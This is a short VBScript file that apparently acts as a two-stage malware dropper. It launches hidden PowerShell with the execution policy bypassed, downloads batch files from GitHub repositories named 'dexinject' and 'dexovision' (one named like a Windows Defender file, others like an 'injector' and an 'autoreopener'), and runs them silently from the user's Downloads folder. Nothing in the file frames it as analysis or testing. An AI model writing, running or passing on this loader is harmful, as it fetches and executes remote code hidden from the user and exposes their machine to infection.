Set WshShell = CreateObject("WScript.Shell")

downloads = WshShell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads")

' --- FIRST STAGE ---
pscom = _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexinject/windows1/main/windowsdef1.bat' -OutFile ""$env:TEMP\windowsdef1.bat""; " & _
    "Set-Location '" & downloads & "'; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' -FilePath ""$env:TEMP\windowsdef1.bat"" -Wait;"

cm = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & Chr(34) & pscom & Chr(34)
WshShell.Run cm, 0, True



' --- SECOND STAGE ---
psCommand = _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector1/main/inh1.bat' -OutFile ""$env:TEMP\inh1.bat""; " & _
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector1/main/autoreopener1.bat' -OutFile ""$env:TEMP\autoreopener1.bat""; " & _
    "Set-Location '" & downloads & "'; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' -FilePath ""$env:TEMP\inh1.bat"" -Wait; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' -FilePath ""$env:TEMP\autoreopener1.bat"";"

cmd = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & Chr(34) & psCommand & Chr(34)
WshShell.Run cmd, 0, True
